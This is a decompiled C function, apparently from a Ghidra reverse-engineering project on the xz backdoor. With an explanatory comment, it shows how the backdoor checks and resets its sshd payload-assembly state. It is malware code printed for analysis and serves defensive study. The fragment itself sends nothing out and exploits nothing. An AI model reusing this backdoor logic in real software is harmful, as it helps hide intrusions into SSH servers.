// /home/kali/xzre-ghidra/xzregh/107EA0_check_backdoor_state.c
// Function: check_backdoor_state @ 0x107EA0
// Calling convention: unknown
// Prototype: undefined check_backdoor_state(void)


/*
 * AutoDoc: Guards the payload assembly state machine. States 1–2 require a populated
 * `sshd_payload_ctx` and a minimum payload length (>=0xae) plus a sane body_length pulled from
 * the decrypted header; state 3 tolerates either 3 or 4; and state 0 expects the staging buffer
 * to be empty. Any inconsistency zeros the state and sets it to 0xffffffff so the hooks know to
 * discard buffered data.
 */
#include "xzre_types.h"


undefined8 check_backdoor_state(long param_1)

{
  int iVar1;
  ulong uVar2;
  BOOL state_in_expected_range;
  BOOL state_matches_exact;
  
  if (param_1 == 0) {
    return 0;
  }
  iVar1 = *(int *)(param_1 + 0x104);
  if (iVar1 < 3) {
    if (0 < iVar1) {
      if (((*(ushort **)(param_1 + 0xf8) != (ushort *)0x0) && (0xad < *(ulong *)(param_1 + 0xe8)))
         && (uVar2 = (ulong)**(ushort **)(param_1 + 0xf8), *(ulong *)(param_1 + 0xe8) <= uVar2)) {
        if (uVar2 <= uVar2 + 0x60) {
          uVar2 = uVar2 + 0x60;
        }
        if (uVar2 <= *(ulong *)(param_1 + 0xe0)) {
          return 1;
        }
      }
      goto LAB_00107f11;
    }
    if (iVar1 != 0) goto LAB_00107f11;
    state_in_expected_range = *(ulong *)(param_1 + 0xe8) < 0xae;
    state_matches_exact = *(ulong *)(param_1 + 0xe8) == 0xae;
  }
  else {
    state_in_expected_range = iVar1 == 3;
    state_matches_exact = iVar1 == 4;
  }
  if (state_in_expected_range || state_matches_exact) {
    return 1;
  }
LAB_00107f11:
  *(undefined4 *)(param_1 + 0x104) = 0xffffffff;
  return 0;
}

